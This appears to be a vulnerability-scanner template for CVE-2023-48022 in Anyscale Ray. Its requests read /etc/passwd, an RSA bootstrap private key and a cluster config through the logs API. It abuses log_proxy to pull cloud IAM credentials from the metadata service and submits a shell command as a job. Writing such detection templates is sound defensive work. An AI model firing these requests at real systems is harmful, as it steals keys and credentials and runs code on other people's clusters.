id: CVE-2023-48022

info:
  name: Anyscale Ray Remote Code Execution Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: Anyscale Ray 2.6.3 and 2.8.0 allows a remote attacker to execute arbitrary code via the job submission API.

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v0/logs/file?node_id={{node_id}}&filename=/etc/passwd&lines=100"

    matchers:
      - type: word
        words:
          - "root:x:0:0:root:/root:/bin/bash"

  - method: GET
    path:
      - "{{BaseURL}}/log_proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ray-autoscaler-v1"

    matchers:
      - type: word
        words:
          - "AccessKeyId"

  - method: GET
    path:
      - "{{BaseURL}}/api/v0/logs/file?node_id={{node_id}}&filename=/home/ray/ray_bootstrap_key.pem&lines=100"

    matchers:
      - type: word
        words:
          - "BEGIN RSA PRIVATE KEY"

  - method: GET
    path:
      - "{{BaseURL}}/api/v0/logs/file?node_id={{node_id}}&filename=/home/ray/ray_bootstrap_config.yaml&lines=100"

    matchers:
      - type: word
        words:
          - "cluster_name"

  - raw:
      - |
        POST /api/jobs/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Content-Length: {{content_length}}

        {
          "cmd": "cat /etc/passwd"
        }

    matchers:
      - type: word
        words:
          - "root:x:0:0:root:/root:/bin/bash"
This template checks for multiple vulnerabilities in Anyscale Ray, including unauthorized file access and remote code execution by sending crafted requests and looking for specific patterns in the responses.